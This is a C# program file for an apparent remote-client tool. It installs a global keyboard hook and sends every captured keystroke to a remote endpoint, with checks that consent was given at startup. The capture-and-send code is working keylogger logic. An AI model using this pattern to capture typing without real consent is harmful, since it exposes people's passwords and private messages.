// Program.cs
using System;
using System.Windows.Forms;
using Keystroke.API;
using RemoteClient.Core;
using RemoteClient.Forms;

namespace RemoteClient
{
    class Program
    {
        private static KeystrokeAPI keystroke;

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
        
            // Start with consent not given
            ConsentManager.ConsentGiven = false;
        
            // Run the welcome form first to get consent
            Application.Run(new Welcome());
        
            // If consent was not given, exit application
            if (!ConsentManager.ConsentGiven)
            {
                Application.Exit();
            }
        }

        public static void Unhook()
        {
            if (keystroke != null)
            {
                keystroke.Dispose();
                keystroke = null;
            }
        }

        public static void InitHook()
        {
            // Only hook keyboard if consent is given
            if (!ConsentManager.ConsentGiven)
            {
                return;
            }

            keystroke = new KeystrokeAPI();
            keystroke.CreateKeyboardHook((character) =>
            {
                // Double-check consent before sending any data
                if (ConsentManager.ConsentGiven)
                {
                    RemoteClient.SendMessage(new DataObject
                    {
                        CommandType = "RTL",
                        CommandName = "RTKL",
                        CommandData = character.ToString()
                    });
                }
            });
        }
    }
}